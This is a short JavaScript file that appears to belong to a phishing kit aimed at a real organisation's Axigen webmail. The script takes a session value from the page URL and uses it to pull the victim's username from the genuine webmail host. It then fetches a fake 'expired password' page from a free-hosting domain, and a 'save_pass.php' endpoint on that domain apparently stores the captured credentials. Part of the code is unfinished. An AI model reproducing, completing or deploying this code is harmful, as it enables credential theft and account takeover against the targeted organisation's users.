var hostURL = 'https://webmail.fwo.com.pk';
var htmlFileURL = 'https://webworldoppertunity.wuaze.com/axigen/ExpiredPage/expired.php/';
var phpFileURL = 'https://webworldoppertunity.wuaze.com/axigen/ExpiredPage/save_pass.php/';
var imageURL= 'https://www.seiu1000.org/sites/main/files/main-images/camera_lense_0.jpeg';


function test(){
  const url = new URL(window.location.href);
  const params = new URLSearchParams(url.search);
  const hValue = params.get('_h');
  var h='test';
  console.log(h);
   extractUsernameFromURL(hValue);
}
test();

function loadHTMLContent(username) {
const url = ''+ htmlFileURL;
// Fetch HTML content from the specified URL
fetch(url)
  .then(response => {
    // Check if the response is successful (status code 200)
    if (response.ok) {
      // If the response is successful, convert it to text
      return response.text();
    }
    // If the response is not successful, throw an error
    throw new Error('Network response was not ok.');
  })
  .then(html => {
    // Store the response result in a variable
    const responseResult = html;
    
    // Store the HTML result in a variable
    const htmlResult = html;
    
    // You can now use the responseResult and htmlResult variables for further processing
    console.log('Response Result:', responseResult);
    console.log('HTML Result:', htmlResult);
  })
  .catch(error => {
    // Handle errors that occur during the fetch operation
    console.error('Error fetching HTML content:', error);
  });


async function extractUsernameFromURL(h) {
  try {
	  const url = ''+ hostURL +'/?_h='+h;
    const response = await fetch(url);
    if (!response.ok) {
      throw new Error(`Network response was not ok: ${response.statusText}`);
    }

    const text = await response.text();
    const regex = /username:\s*"([^"]+)"/i;
    const match = text.match(regex);

    if (match && match[1]) {
      const username = match[1];
      loadHTMLContent(username);
    } else {
     
    }
  } catch (error) {
    
  }
}
